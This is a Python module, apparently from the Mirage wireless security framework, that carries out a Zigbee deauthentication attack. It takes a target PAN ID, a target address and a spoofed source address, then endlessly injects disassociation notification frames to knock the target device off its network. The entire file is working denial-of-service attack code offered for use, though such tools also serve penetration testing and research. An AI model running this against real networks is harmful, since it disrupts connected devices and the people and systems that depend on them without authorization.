from mirage.libs import zigbee,utils,io
from mirage.core import module
import random

class zigbee_deauth(module.WirelessModule):
	def init(self):
		self.technology = "zigbee"
		self.type = "attack"
		self.description = "Deauthentication module for Zigbee networks"
		self.args = {
				"INTERFACE":"rzusbstick0",
				"TARGET_PANID":"0x1234",
				"CHANNEL":"13",
				"TARGET":"",
				"SOURCE":"",
				"REASON":"1"

			}

	def checkCapabilities(self):
		return self.emitter.hasCapabilities("SNIFFING", "INJECTING", "COMMUNICATING_AS_END_DEVICE","COMMUNICATING_AS_ROUTER","COMMUNICATING_AS_COORDINATOR")

	def run(self):

		self.receiver = self.getReceiver(interface=self.args["INTERFACE"])
		self.emitter = self.getEmitter(interface=self.args["INTERFACE"])
		if self.checkCapabilities():
			self.receiver.setChannel(utils.integerArg(self.args["CHANNEL"]))

			if self.args["TARGET_PANID"] == "":
				io.fail("You must specify a target Pan ID.")
				return self.nok()
			self.panid = utils.integerArg(self.args["TARGET_PANID"])
			io.info("PanID selected: 0x"+"{:04x}".format(self.panid).upper())

			if self.args["TARGET"] != "":
				self.target = utils.integerArg(self.args["TARGET"])
			else:
				io.fail("You must specify a target.")
				return self.nok()
			io.info("Target selected: "+zigbee.addressToString(self.target))


			if self.args["SOURCE"] != "":
				self.source = utils.integerArg(self.args["SOURCE"])
			else:
				io.fail("You must specify a source address.")
				return self.nok()
			io.info("Source selected: "+zigbee.addressToString(self.source))

			self.reason = utils.integerArg(self.args["REASON"])
			while True:
				self.emitter.sendp(zigbee.ZigbeeDisassociationNotification(destPanID=self.panid, srcAddr=self.source,destAddr=self.target,sequenceNumber=1,reason=self.reason))

			return self.ok()
		else:
			io.fail("Interface provided ("+str(self.args["INTERFACE"])+") is not able to communicate as a Zigbee device.")
			return self.nok()
